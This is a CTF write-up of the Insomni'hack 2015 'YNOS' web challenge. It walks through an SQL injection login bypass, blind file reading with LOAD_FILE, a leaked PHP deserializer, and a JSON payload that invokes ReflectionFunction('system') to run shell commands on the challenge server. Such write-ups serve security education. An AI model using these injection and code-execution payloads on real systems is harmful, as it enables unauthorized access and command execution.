# Insomni’hack CTF Teaser 2015: YNOS

**Category:** Web
**Points:** 100
**Author:** clZ
**Description:**

> <https://www.youtube.com/watch?v=O2rGTXHvPCQ>
> <a href="http://www.youtube.com/watch?v=O2rGTXHvPCQ"><img src="http://img.youtube.com/vi/O2rGTXHvPCQ/0.jpg" border="3" width="640" height="480"/></a>
>
> So many hacking scenes, so little sk1llz…
>
> Apparently [this website](http://ynos.teaser.insomnihack.ch/) likes these stupid films. Pwn them and get the flag which is in a pretty obvious file in the webroot.

## Write-up

<http://ynos.teaser.insomnihack.ch/> presents a login screen. Some random guesses reveal we can log in using the username `admin` with password `admin`. Now we can browse artists, films, and directors. Clicking any of those links triggers an Ajax request to `/INSO.RPC` with some JSON-formatted data:

```bash
$ curl -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Cache-Control: no-cache' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: AWSELB=CFABFDBD1C5BB6C16340B9340EA064028E4DF570D44D64084C319E70EE8D963FBDB0FBB63151BAE16EB9FFA8E0D4123E34E5D7D9AA1E396E163C4F960FFBFF45E6083CB961; session=fe5e3eddfcad1992c22b98cfd8d3e5b3' --data-binary '{"c":{"name":"page"},"a":{"name":"render","params":{"name":"artists"}}}' 'http://ynos.teaser.insomnihack.ch/INSO.RPC'
<fieldset>

<!-- Form Name -->
<legend>Artists</legend>


<ul class="list-group">
  <li class="list-group-item">Jonny Lee Miller</li>
  <li class="list-group-item">Angelina Jolie</li>
  <li class="list-group-item">Jesse Bradford</li>
  <li class="list-group-item">Matthew Lillard</li>
  <li class="list-group-item">Laurence Mason</li>
  <li class="list-group-item">Fisher Stevens</li>
</ul>

</fieldset>
```

### By team "curryboys" - Istvan Chung, Husayn Karimi, William Marshall

This one boils down to a boolean SQL injection attack and a code
execution from a custom PHP deserialization function. I noticed by
using Firebug that the main login screen encodes the username and
password as JSON in a POST request to /INSO.RPC on the server, in the format

```
{"c":{"name":"user"},"a":{"name":"login","params":"username|password"}}
```

Although I didn't know it at the time, it turns out that this is in fact
the serialized format of a `c`lass called `user`, requesting the
`a`ction `login`, a function to be called with the given parameters.
Placing the string `' OR 1=1 --` in for username allowed me to login and
get a session cookie quite easily. However, all this lets us do is make
another call of the form

```
{"c":{"name":"page"},"a":{"name":"render","params":"home"}}
```

(where we can substitute `"artists"`, `"films"`, `"directors"`, or
`"logout"` instead of `"home"`). Unfortunately, none of those pages are
of any use, so I went back to the original SQL injection. The challenge
states that the flag is in an "obvious" file in the webroot, so I
decided that I'd try to find where that was on the server. Since we can
get binary information out of the SQL injection (login failed or
succeeded), we can test for the presence of files using the query

```
LOAD_FILE('/path/to/file') IS NOT NULL
```

I managed to find `/etc/apache2/apache2.conf`, indicating that we were
looking at an Apache 2 server, and through trial and error eventually
found the existence of `/var/www/html/index.php`. Quick testing showed
that `flag.txt`, `flag`, `FLAG`, etc were not present, so I used binary
search to brute-force first the length, and then the contents of
`index.php` and `INSO.RPC` character-by-character, which contain
references to `classes.php` and `functions.php`, which I read out as
well. `functions.php` is reproduced here:

```
<?php

function parseParams($params) {
  if(is_array($params)) {
    return $params;
  }
  else {
    return explode("|",$params);
  }
}

function myDeserialize($object) {
  global $session;
  $class = $object["c"];
  $action = $object["a"];
  $cname = $class["name"];
  $cparams = Array();
  if(isset($class["params"])) {
    $cparams = $class["params"];
  }
  $my_obj = new $cname($cparams);
  $aname = $action["name"];
  $aparams = Array();
  if(isset($action["params"])) {
    $aparams = parseParams($action["params"]);
  }

  call_user_func_array(array($my_obj,$aname),$aparams);

}

?>
```

`myDeserialize` is called by INSO.RPC to handle every incoming request.
It lets us create an instance of any class we desire with any
constructor parameters, and then call any method on that class with any
parameters. We'd like to just call a function like `system`, but
`system` isn't the method of any class. In addition, the classes in
`classes.php` appeared to be useless for locating the flag. However,
the PHP built-in class [`ReflectionFunction`][rf] comes to the rescue, as
its `invoke` method lets us call the function we supply in the
constructor. We can use the serialization vulnerability to make the
call

```
new ReflectionFunction("system").invoke("ls")
```

We serialize this into

```
{"c":{"name":"ReflectionFunction", "params":"system"},
 "a":{"name":"invoke","params":"ls"}}
```

and we get the celebration-inducing output

```
INSO.RPC
___THE_FLAG_IS_IN_HERE___
___THE_FLAG_IS_IN_HERE___.save
artists.php
bootstrap.min.css
bootstrap.min.js
classes.php
directors.php
films.php
functions.php
home.php
index.php
jquery-2.1.1.min.js
login.php
logout.php
preload.php
```

Changing `ls` to `cat ___THE_FLAG_IS_IN_HERE___` gives us our flag:

```
INS{Gotta_L0ve_l33t_serialization_suff!}
```

[rf]: http://php.net/manual/en/class.reflectionfunction.php

## Other write-ups and resources

* none yet
